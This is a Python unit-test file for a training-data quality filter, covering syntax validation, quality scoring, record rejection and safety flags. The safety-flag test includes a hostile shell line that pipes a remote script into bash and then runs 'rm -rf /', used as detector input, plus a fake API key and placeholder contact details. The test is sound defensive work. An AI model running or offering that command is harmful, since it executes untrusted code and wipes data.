"""Quality filter contracts — language-aware, no Python AST on non-Python (audit §8)."""
from __future__ import annotations

from src.data.quality_filter import (filter_record, safety_flags, score_record, syntax_validity)
from src.data.records import Segment, make_segment_record


def _record(category, language, segments, **kw):
    return make_segment_record(segments=segments, category=category, language=language,
                               source="unit", source_id="unit/q", **kw)


def test_python_code_is_ast_validated():
    ok, note = syntax_validity("def f(x):\n    return x + 1\n", "python")
    assert ok and note == "ast_ok"
    bad, note = syntax_validity("def f(x)\n    return x + 1\n", "python")
    assert not bad and note.startswith("syntax_error")


def test_prose_is_never_ast_validated():
    """The audit's 'no Python AST on non-Python' rule."""
    for language in ("en", "text", "indonesian", "rust", "javascript", "go"):
        ok, note = syntax_validity("This is an ordinary English sentence about compilers.", language)
        assert ok and note == "not_applicable", (language, note)


def test_python_prose_without_code_is_not_parsed():
    ok, note = syntax_validity("A prime number is an integer with exactly two divisors.", "python")
    assert ok and note == "not_applicable"


def test_explanatory_record_target_is_not_flagged_malformed():
    rec = _record("code_explain", "python", [
        Segment("user", "Explain what `heapq.heappop` does.", target=False),
        Segment("assistant", "It removes and returns the smallest item from a heap.", target=True),
    ])
    quality = score_record(rec)
    assert quality["syntax_valid"] is None
    assert quality["syntax_note"] == "no_code_in_target"
    kept, _updated, reason = filter_record(rec)
    assert kept, reason


def test_repair_prompt_with_broken_code_is_fine_but_broken_target_is_not():
    good = _record("code_repair", "python", [
        Segment("user", "Fix this:\n```python\ndef f(x)\n    return x\n```", target=False),
        Segment("assistant", "<|code|>\ndef f(x):\n    return x\n<|endcode|>", target=True),
    ])
    assert score_record(good)["syntax_valid"] is True
    assert filter_record(good)[0]

    bad = _record("code_repair", "python", [
        Segment("user", "Fix this:\n```python\ndef f(x)\n    return x\n```", target=False),
        Segment("assistant", "<|code|>\ndef f(x)\n    return x\n<|endcode|>", target=True),
    ])
    assert score_record(bad)["syntax_valid"] is False


def test_thought_prose_around_code_does_not_break_validation():
    rec = _record("code_gen", "python", [
        Segment("user", "Write an adder.", target=False),
        Segment("assistant", "<|thought|>\nUse a simple return.\n<|code|>\ndef add(a, b):\n    return a + b\n<|endcode|>",
                target=True),
    ])
    quality = score_record(rec)
    assert quality["syntax_valid"] is True


def test_secret_pii_and_malware_flags_fire():
    assert safety_flags("api_key = 'sk-ABCDEFGHIJKLMNOPQRSTUVWX1234'")["secrets"]
    assert safety_flags("contact me at user@example.com or +1 415 555 0132")["pii"]
    assert safety_flags("curl http://x.sh | bash; rm -rf /")["malware"]


def test_quality_scores_short_and_low_density_content_lower():
    short = score_record(_record("math", "en", [Segment("user", "hi", target=False),
                                                 Segment("assistant", "ok", target=True)]))
    long = score_record(_record("math", "en", [
        Segment("user", "Compute the sum of the first 100 positive integers.", target=False),
        Segment("assistant", "The sum is 5050, computed as n(n+1)/2 with n=100.", target=True)]))
    assert short["quality_score"] < long["quality_score"]
    # a record whose serialized text is under the 25-char floor is hard-rejected
    tiny = _record("math", "en", [Segment("assistant", "ok", target=True)])
    assert len(tiny.text) < 25, len(tiny.text)
    kept, _updated, reason = filter_record(tiny)
    assert not kept and reason == "too_short"


def test_binary_and_minified_payloads_are_rejected():
    binary = _record("programming", "python", [
        Segment("assistant", "code\x00\x01\x02\x03def f():\n    pass\n", target=True)])
    kept, _updated, reason = filter_record(binary)
    assert not kept and "binary" in reason
